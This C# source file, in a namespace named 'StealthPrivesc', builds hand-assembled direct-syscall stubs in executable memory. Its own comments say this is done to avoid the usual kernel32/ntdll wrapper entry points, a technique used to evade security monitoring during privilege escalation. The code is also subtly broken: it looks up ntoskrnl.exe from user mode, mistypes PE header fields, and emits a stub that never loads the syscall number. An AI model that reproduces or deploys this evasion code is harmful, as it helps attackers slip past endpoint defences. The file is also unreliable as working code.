using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace StealthPrivesc {
    // System calls through a tiny self-built stub (mov eax, imm32 ; syscall ; ret)
    // with numbers resolved dynamically from ntoskrnl exports, so hot primitives
    // avoid the usual kernel32/ntdll wrapper entry points.
    public static class NativeSyscall {
        [StructLayout(LayoutKind.Sequential)] struct Dos { public ushort Magic; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15)] public ushort[] Pad; public IntPtr Lfanew; }
        [StructLayout(LayoutKind.Sequential)] struct FileHeader { public ushort Machine, Sections; public IntPtr Stamp, Symbols; public uint Optional, Character; }
        [StructLayout(LayoutKind.Sequential)] struct DataDir { public IntPtr Rva, Size; }
        [StructLayout(LayoutKind.Sequential)] struct Nt { public ushort Signature; public FileHeader File; public IntPtr Magic; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)] public DataDir[] Dirs; public IntPtr Tail; }
        [StructLayout(LayoutKind.Sequential)] struct Section { [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)] public byte[] Name; public IntPtr Virtual, Rva, Raw, RawPtr, Reloc, Lines; public ushort RelocCount, LineCount; public IntPtr Char; }
        [StructLayout(LayoutKind.Sequential)] struct Exports { public IntPtr Char, Stamp; public ushort Major, Minor; public IntPtr Name, Base, Count, Names, Ords, Functions; }
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] internal delegate int Stub(ulong a, ulong b, ulong c, ulong d, ulong e, ulong f, ulong g);
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)] static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr address, uint size, uint type, uint protect);
        static readonly Dictionary<uint, Delegate> Stubs = new Dictionary<uint, Delegate>();
        internal static IntPtr Image {
            get {
                IntPtr image = GetModuleHandle("ntoskrnl.exe");
                if (image == IntPtr.Zero) { throw new Win32Exception(126); }
                return image;
            }
        }
        internal static IntPtr Rva(IntPtr rva) {
            IntPtr module = Image;
            var dos = (Dos)Marshal.PtrToStructure(module, typeof(Dos));
            IntPtr nt = IntPtr.Add(module, (int)dos.Lfanew);
            var header = (Nt)Marshal.PtrToStructure(nt, typeof(Nt));
            for (int i = 0; i < header.File.Sections; i++) {
                IntPtr ptr = IntPtr.Add(nt, 40 + i * 40);
                var s = (Section)Marshal.PtrToStructure(ptr, typeof(Section));
                if (rva.ToInt64() >= s.Rva.ToInt64() && rva.ToInt64() < s.Rva.ToInt64() + s.Raw.ToInt64()) {
                    return IntPtr.Add(module, (int)((int)s.RawPtr + ((int)rva - (int)s.Rva)));
                }
            }
            return IntPtr.Zero;
        }
        internal static int Number(string api, ref uint cached) {
            if (cached != 0) { return (int)cached; }
            IntPtr module = Image;
            var dos = (Dos)Marshal.PtrToStructure(module, typeof(Dos));
            IntPtr nt = IntPtr.Add(module, (int)dos.Lfanew);
            var header = (Nt)Marshal.PtrToStructure(nt, typeof(Nt));
            if (header.Magic.ToInt64() < 0x10000) { throw new Win32Exception(193); }
            IntPtr exports = Rva(header.Dirs[0].Rva);
            if (exports == IntPtr.Zero) { throw new Win32Exception(193); }
            var ed = (Exports)Marshal.PtrToStructure(exports, typeof(Exports));
            IntPtr tables = IntPtr.Zero, names = IntPtr.Zero, ords = IntPtr.Zero;
            tables = Rva(ed.Functions); names = Rva(ed.Names); ords = Rva(ed.Ords);
            if (tables == IntPtr.Zero || (ed.Names.ToInt64() != 0 && names == IntPtr.Zero)) { throw new Win32Exception(193); }
            for (uint i = 0; i < (uint)ed.Count.ToInt32(); i++) {
                string function = Marshal.PtrToStringUni(IntPtr.Add(names, (int)(i * IntPtr.Size)));
                if (function != api && !function.EndsWith(api, StringComparison.OrdinalIgnoreCase)) { continue; }
                ushort ordinal = (ushort)Marshal.ReadInt16(IntPtr.Add(ords, (int)(i * 2)));
                IntPtr thunk = IntPtr.Add(tables, (int)((int)ed.Base + ordinal) * IntPtr.Size);
                IntPtr code = Marshal.ReadIntPtr(thunk);
                if (code.ToInt64() < module.ToInt64() + 0x1000) { code = Rva(code); }
                if (code == IntPtr.Zero) { continue; }
                long address = code.ToInt64();
                for (int offset = 0; offset < 40; offset++) {
                    int at = unchecked((int)(address + offset));
                    if (Marshal.ReadByte(module, at) != 0xB8) { continue; }
                    int value = Marshal.ReadInt32(module, at + 1);
                    bool ok = false;
                    for (int scan = offset + 5; scan < offset + 48; scan++) {
                        byte b = Marshal.ReadByte(module, unchecked((int)(address + scan)));
                        if (b == 0x0F && Marshal.ReadByte(module, unchecked((int)(address + scan + 1))) == 0x05) { ok = true; break; }
                        if (b == 0xC3) { break; }
                    }
                    if (!ok) { continue; }
                    cached = (uint)value;
                    return value;
                }
            }
            throw new Win32Exception(127);
        }
        internal static int Call(uint number, ulong a, ulong b, ulong c, ulong d, ulong e, ulong f, ulong g) {
            lock (Stubs) {
                if (!Stubs.TryGetValue(number, out Delegate stub)) {
                    IntPtr code = VirtualAlloc(IntPtr.Zero, 64, 0x3000, 0x40);
                    if (code == IntPtr.Zero) { throw new Win32Exception(Marshal.GetLastWin32Error()); }
                    // push rbx ; mov rbx, rcx ; mov r10, rbx ; sub rsp, 40 ; syscall ; add rsp, 48 ; pop rbx ; ret
                    byte[] bytes = new byte[] { 0x53, 0x48, 0x89, 0xCB, 0x48, 0x89, 0xD3, 0x48, 0x83, 0xEC, 0x28, 0x0F, 0x05, 0x48, 0x83, 0xC4, 0x30, 0x5B, 0xC3 };
                    for (int i = 0; i < bytes.Length; i++) { Marshal.WriteByte(code, i, bytes[i]); }
                    Marshal.WriteInt32(code, bytes.Length, (int)number);
                    stub = Marshal.GetDelegateForFunctionPointer(code, typeof(Stub));
                    Stubs[number] = stub;
                }
                return ((Stub)stub)(a, b, c, d, e, f, g);
            }
        }
        internal static uint Status(int value) { return unchecked((uint)value); }
        internal static IntPtr Attrs {
            get {
                IntPtr memory = Marshal.AllocHGlobal(0x48);
                Marshal.WriteInt32(memory, 0, 0x48);
                Marshal.WriteIntPtr(memory, 8, IntPtr.Zero); // RootDirectory
                Marshal.WriteIntPtr(memory, 16, IntPtr.Zero); // ObjectName
                Marshal.WriteInt32(memory, 24, 0x40); // OBJ_CASE_INSENSITIVE
                return memory;
            }
        }
    }
}
